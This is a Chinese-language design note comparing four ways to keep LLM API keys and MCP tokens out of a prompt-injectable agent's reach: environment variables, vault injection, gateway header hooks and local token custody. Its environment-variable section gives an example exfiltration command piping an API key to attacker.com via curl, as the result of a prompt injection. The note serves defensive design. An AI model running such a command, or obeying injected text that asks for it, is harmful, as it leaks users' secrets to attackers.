# PB-005: 凭据安全管理

## 问题

LLM API key、MCP token、GitHub token 这些凭据该放在哪？如何确保 Agent（可能被 prompt injection）不会泄露它们？

## 关键维度

- 凭据的存放位置（环境变量？数据库？Vault？）
- 凭据的注入时机（Session 创建？每次 LLM 调用？）
- Agent 能否访问凭据（能读环境变量？能 cat 配置文件？）

## 核心原则（来自 Anthropic 文章）

> 凭据不能通过「缩小 scope」来保护——那编码了一个「Claude 不能用受限 token 做什么」的假设。
> 凭据必须在架构层面保证不进沙盒。

## 参考方案

### 方案 A：环境变量（Claude Code 现状）

```
API key 在环境变量中
Agent 能在 Bash 中 echo $ANTHROPIC_API_KEY
```

- 风险：prompt injection → Agent 执行 `echo $API_KEY | curl -d @- attacker.com`
- 现状：很多简单场景这样用，不安全但方便

### 方案 B：Vault 注入（Anthropic 的 Managed Agents）

```
凭据存在 Vault 中（独立于 Sandbox）
Session 创建时传入 vault_ids
Anthropic 管理 OAuth token 刷新
Agent 定义中无 token
```

- 优点：Agent 看不到凭据，架构保证安全
- 缺点：依赖 Vault 基础设施

### 方案 C：Plugin Hook 注入

```
LLM token 在 Gateway 层通过 chat.headers hook 注入
Token 出现在 HTTP 请求头中，不出现在 Agent 上下文
Bash 执行时 token 不在环境变量中
```

- 优点：Gateway + Plugin 即可实现，不需要独立 Vault
- 缺点：Plugin 代码本身需要安全审计

### 方案 D：mcpc 内保管（MCP Token 专用）

```
LLM Token → 云端的 Plugin Hook 注入
MCP Token → 存在用户本地的 mcpc 中
Agent 只知道 MCP Tool 的接口，不知道 token
```

- 优点：MCP Token 不出用户本地，安全性最高
- 缺点：需要 mcpc 本地进程

## 关键取舍

| | 环境变量 | Vault 注入 | Plugin Hook | mcpc 保管 |
|---|---|---|---|---|
| Agent 能看到 | 能 | 不能 | 不能 | 不能 |
| 实现复杂度 | 最低 | 高 | 中 | 中 |
| 安全性 | 低 | 高 | 中高 | 高 |
| 适用凭据类型 | 全部 | OAuth | LLM API Key | MCP Token |

## 相关研究
- [RH-011] Managed Agents API 的 vault_ids
- [RH-004] OpenCode 的 chat.headers hook
